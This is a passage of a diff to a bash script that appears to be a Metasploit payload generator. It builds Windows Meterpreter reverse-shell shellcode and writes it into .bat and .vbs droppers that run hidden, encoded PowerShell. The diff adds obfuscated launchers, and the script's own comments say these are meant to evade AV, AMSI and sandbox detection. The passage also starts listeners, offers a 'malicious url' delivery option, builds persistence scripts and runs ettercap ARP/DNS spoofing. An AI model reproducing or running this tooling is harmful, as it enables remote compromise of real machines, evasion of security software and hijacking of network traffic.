-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
 
             cd $IPATH/output
@@ -3772,9 +3836,9 @@ serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload store
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" 
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" 
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
         fi
@@ -3821,7 +3885,7 @@ lport=$(zenity --title="☠ Enter LPORT ☠" --text "example: 666" --entry --wid
 N4m=$(zenity --entry --title "☠ SHELLCODE NAME ☠" --text "Enter shellcode output name\nexample: shellcode" --width 300) > /dev/null 2>&1
 
 # input payload choise
-paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/shell_bind_tcp" FALSE "windows/shell/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_tcp_dns" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/meterpreter/reverse_winhttps" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 390) > /dev/null 2>&1
+paylo=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\nAvailable Payloads:" --radiolist --column "Pick" --column "Option" TRUE "windows/meterpreter/reverse_tcp" FALSE "windows/meterpreter/reverse_http" FALSE "windows/meterpreter/reverse_https" FALSE "windows/x64/meterpreter/reverse_tcp" FALSE "windows/x64/meterpreter/reverse_https" --width 350 --height 300) > /dev/null 2>&1
 
 echo "[☠] Building shellcode -> psh-cmd format ..."
 sleep 2
@@ -3843,10 +3907,11 @@ cat << !
 !
 
 # use metasploit to build shellcode
-if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd > $IPATH/output/chars.raw"
+KEYID=$(cat /dev/urandom | tr -dc '13' | fold -w 3 | head -n 1)
+if [ "$paylo" = "windows/x64/meterpreter/reverse_https" ]; then
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport HandlerSSLCert=$IPATH/obfuscate/www.gmail.com.pem StagerVerifySSLCert=true -f psh-cmd -n 20 > $IPATH/output/chars.raw"
 else
-xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd > $IPATH/output/chars.raw"
+xterm -T " SHELLCODE GENERATOR " -geometry 110x23 -e "msfvenom -p $paylo LHOST=$lhost LPORT=$lport -f psh-cmd -n $KEYID > $IPATH/output/chars.raw"
 fi
 
 
@@ -3881,16 +3946,25 @@ sleep 2
 cd $IPATH/output/
 echo "[☠] Injecting shellcode -> $N4m.bat!"
 sleep 2
-echo ":: powershell bat template | Author: r00t-3xp10it" > $N4m.bat
-echo ":: unicorn - reproduction (base64 encoded)" >> $N4m.bat
-echo ":: ---" >> $N4m.bat
-echo "@echo off" >> $N4m.bat
-echo "powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $disp" >> $N4m.bat
+OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay 3 sec is execution to evade sandbox detection'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" FALSE "Relik PS obfuscation" --width 353 --height 255) > /dev/null 2>&1
+if [ "$OBF" = "None-Obfuscation (default)" ]; then
+echo "@echo off&&powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $disp" >> $N4m.bat
+elif [ "$OBF" = "Relik PS obfuscation" ]; then
+echo "powershell /w 1 /C \"s''v rl -;s''v Ln e''c;s''v mYz ((g''v rl).value.toString()+(g''v Ln).value.toString());powershell (g''v mYz).value.toString()('$disp')\"" >> $N4m.bat
+else
+echo "[✔] String obfuscation technics sellected .."
+# OBFUSCATE SYSCALLS (evade AV/AMSI + SandBox Detection)
+# https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/simple_obfuscation.md
+# HINT: setting -ExecutionPolicy/-ep is redundant since -EncodedCommand/-enc automatically bypasses the execution policy
+#
+# STRING: cmd.exe /c powershell.exe -NoPRo -wIN 1 -nONi -eN $disp
+echo "@e%!%ch^O Of^f&&(,(,, (,;Co%LD%p%La%y %windir%\\\Le%!HuB!%git^Che%i%ck^Co%U%nt%-3%rol\".\"d^ll %temp%\\key^s\\Le^git^C%OM%he^ck^Cont%-R%rol.t^m%A%p));,, )&,( (,, @pi%!h%n^g -^n 4 w%%!hw^w.mi^cro%d0b%sof^t.c^o%OI%m > %tmp%\\lic%dR%e^ns%at%e.p^em);, ,) &&,(, (,,%$'''%, (,;c^Md%i%\".\"e%i0%X^e ,,/^R =c^O%Unt-8%p^Y /^Y %windir%\\Sy^s%dE%te^m%-%32\\Win^do%'''%w^s%AT%Power%Off%s^he%$'''%ll\\\v1.0\\p^o%IN%we^rs^%-iS%hell.e%!'''$%x%-i%e ,;^, %tmp%\\W^UAU%-Key%CTL.m%$%s%$'''%c &&,,, @c^d ,, %tmp% && ,;WU%VoiP%AUC%$,,,,%TL.m%-8%s^c /^No%db%PR^o  /w%Eb%\"I\"^N 1 /^%$'''%n\"O\"N%Func%i  /^eN%GL% $disp),) %i% ,,)" > $N4m.bat
+fi
 chmod +x $IPATH/output/$N4m.bat
 
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
-serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
+serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.bat\nchose how to deliver: $N4m.bat" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 230) > /dev/null 2>&1
 
    if [ "$serv" = "multi-handler (default)" ]; then
       # START METASPLOIT LISTENNER (multi-handler with the rigth payload)
@@ -3938,7 +4012,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.bat on target every 23 hours" --width 300) > /dev/null 2>&1
 
     cd $IPATH/aux
-    # Build persistence script (AutoRunStart='multi_console_command -rc')
+    # Build persistence script (AutoRunStart='multi_console_command -r')
     cp persistence.rc persistence[bak].rc
     sed -i "s|N4m|$N4m.bat|g" persistence.rc
     sed -i "s|IPATH|$IPATH|g" persistence.rc
@@ -4035,9 +4109,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
 
             cd $IPATH/output
@@ -4056,9 +4130,9 @@ fi
           else
 
            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
            fi
           fi
 
@@ -4076,9 +4150,9 @@ fi
           if [ "$MsFlF" = "ON" ]; then
 
            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            fi
 
             cd $IPATH/output
@@ -4097,9 +4171,9 @@ fi
           else
 
            if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+             xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
            else
-            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+            xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
           fi
         fi
    fi
@@ -4312,9 +4386,9 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
 
             cd $IPATH/output
@@ -4333,9 +4407,9 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
           fi
 
@@ -4353,9 +4427,9 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
 
             cd $IPATH/output
@@ -4374,9 +4448,9 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'"
             fi
           fi
         fi
@@ -4477,7 +4551,10 @@ sleep 2
       exit
       fi
 
+OBF=$(zenity --list --title "☠ AGENT STRING OBFUSCATION ☠" --text "Obfuscate the agent [ template ] command arguments ?\nUsing special escape characters, whitespaces, concaternation, amsi\nsandbox evasion and variables piped and de-obfuscated at runtime\n'The agent will delay is execution to evade sandbox detection (msgbox)'" --radiolist --column "Pick" --column "Option" TRUE "None-Obfuscation (default)" FALSE "String Obfuscation (3 sec)" --width 353 --height 245) > /dev/null 2>&1
 
+
+if [ "$OBF" = "None-Obfuscation (default)" ]; then
    # check if exec.vbs as generated
    if [ -e $IPATH/templates/exec.vbs ]; then
       echo "[☠] exec.vbs  -> found!"
@@ -4489,7 +4566,6 @@ sleep 2
       exit
       fi
 
-
 # injecting shellcode into name
 cd $IPATH/templates/
 echo "[☠] Injecting shellcode -> $N4m.vbs!"
@@ -4498,7 +4574,17 @@ sed "s|InJ3C|$disp|" exec.vbs > $N4m.vbs
 mv $N4m.vbs $IPATH/output/$N4m.vbs
 chmod +x $IPATH/output/$N4m.vbs
 
-
+else
+echo "[✔] String obfuscation technic sellected .."
+sleep 2
+echo "[☠] Injecting shellcode -> $N4m.vbs!"
+sleep 2
+#
+# STRING: powershell.exe -wIN 1 -noP -noNI -eN $disp
+#
+echo "dIm i0dIfQ,f0wBiQ,U1kJi0,dIb0fQ:U1kJi0=\"/wINe\"+\"NPoW\"&\"eR1nO\"+\"PSh\"&\"ElLn\"+\"oNI\":i0dIfQ=rEpLaCe(\"In\"&\"si0al\"+\"ling up\"&\"da\"+\"i0es.\",\"i0\",\"t\"):mSgbOx i0dIfQ:f0wBiQ=mid(U1kJi0,7,5)&MiD(U1kJi0,16,5)&\" \"&mId(U1kJi0,1,4)&\" 1 \"&mId(U1kJi0,1,1)&MiD(U1kJi0,13,3)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,21,4)&\" \"&mId(U1kJi0,1,1)&mId(U1kJi0,5,2)&\" $disp\":sEt dIb0fQ=cReAtEObJeCt(\"\"+\"W\"&\"sCr\"+\"Ip\"&\"t.Sh\"+\"El\"&\"L\"):dIb0fQ.rUn f0wBiQ" > $IPATH/output/$N4m.vbs
+cd $IPATH/output
+fi
 
 # CHOSE HOW TO DELIVER YOUR PAYLOAD
 serv=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "Payload stored:\n$IPATH/output/$N4m.vbs\n\nExecute: press 2 times to 'execute'\n\nchose how to deliver: $N4m.vbs" --radiolist --column "Pick" --column "Option" TRUE "multi-handler (default)" FALSE "apache2 (malicious url)" --width 305 --height 260) > /dev/null 2>&1
@@ -4549,7 +4635,7 @@ P0=$(zenity --list --title "☠ SHELLCODE GENERATOR ☠" --text "\npost-exploita
   M1P=$(zenity --entry --title "☠ AUTO-START PAYLOAD ☠" --text "\nAuto-start payload Every specified hours 1-23\n\nexample: 23\nwill auto-start $N4m.vbs on target every 23 hours" --width 300) > /dev/null 2>&1
 
     cd $IPATH/aux
-    # Build persistence script (AutoRunStart='multi_console_command -rc')
+    # Build persistence script (AutoRunStart='multi_console_command -r')
     cp persistence.rc persistence[bak].rc
     sed -i "s|N4m|$N4m.vbs|g" persistence.rc
     sed -i "s|IPATH|$IPATH|g" persistence.rc
@@ -4665,9 +4751,9 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
           if [ "$MsFlF" = "ON" ]; then
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'spool $IPATH/output/report.log; use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             fi
 
             cd $IPATH/output
@@ -4686,9 +4772,9 @@ rUn=$(zenity --question --title="☠ SHELLCODE GENERATOR ☠" --text "Zip payloa
           else
 
             if [ "$paylo" = "windows/meterpreter/reverse_winhttps" ]; then
-              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -rc $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
+              xterm -T " PAYLOAD MULTI-HANDLER " -geometry 110x23 -e "sudo msfconsole -x 'use exploit/multi/handler; set LHOST $lhost; set LPORT $lport; set PAYLOAD $paylo; set HandlerSSLCert $IPATH/obfuscate/www.gmail.com.pem; set StagerVerifySSLCert true; set AutoRunScript multi_console_command -r $IPATH/aux/$P0; exploit'" & xterm -T " DNS_SPOOF [redirecting traffic] " -geometry 110x10 -e "sudo ettercap -T -q -i $InT3R -P dns_spoof -M ARP // //"
             else
